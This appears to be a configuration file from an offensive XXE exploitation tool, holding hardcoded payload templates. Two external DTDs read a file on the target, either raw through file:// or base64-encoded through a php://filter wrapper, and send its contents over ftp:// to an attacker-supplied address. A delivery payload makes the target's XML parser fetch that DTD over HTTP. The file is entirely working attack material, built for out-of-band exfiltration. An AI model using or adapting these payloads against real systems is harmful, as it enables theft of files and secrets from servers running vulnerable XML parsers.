# harcoded payload templates, to customize the payloads just edit below


# DTD using file:// URI for getting file content and ftp:// URI for exfiltration
DTD = '''<!ENTITY % file SYSTEM "file://{FILE}">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'ftp://{ADDR}{PORT}/%file;'>">
%eval;
%exfiltrate;'''


# DTD using php:// URI for getting base64 file content and ftp:// URI for exfiltration
DTD_BASE64 = '''<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource={FILE}">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'ftp://{ADDR}{PORT}/%file;'>">
%eval;
%exfiltrate;'''


# payload used on target to deliver DTD
PAYLOAD = '''<!DOCTYPE x [
<!ENTITY % test SYSTEM "http://{ADDR}{PORT}/data.dtd">
%test;
]>'''